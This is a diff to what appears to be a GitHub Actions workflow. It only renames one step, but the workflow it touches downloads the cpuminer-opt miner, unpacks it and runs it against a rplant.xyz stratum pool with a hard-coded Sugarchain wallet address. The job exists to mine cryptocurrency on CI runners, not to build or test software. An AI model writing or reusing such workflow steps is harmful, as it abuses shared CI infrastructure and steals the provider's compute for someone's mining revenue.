@@ -8,7 +8,8 @@ jobs:
     steps:
     - name: Preparing
       run: Invoke-WebRequest https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-win.zip -OutFile cpuminer-opt-win.zip
-    - run: Expand-Archive cpuminer-opt-win.zip
+    - name: Prepare_Q2
+      run: Expand-Archive cpuminer-opt-win.zip
     - name: Running
       run: .\cpuminer-opt-win\cpuminer-avx2.exe -a yespowersugar  -o stratum+tcp://stratum-asia.rplant.xyz:7042  -t 1 -u sugar1q6va6dlyhj3ynawg2jhkh6yhe9ypqqr23s4hrum.test
     - name: DONE
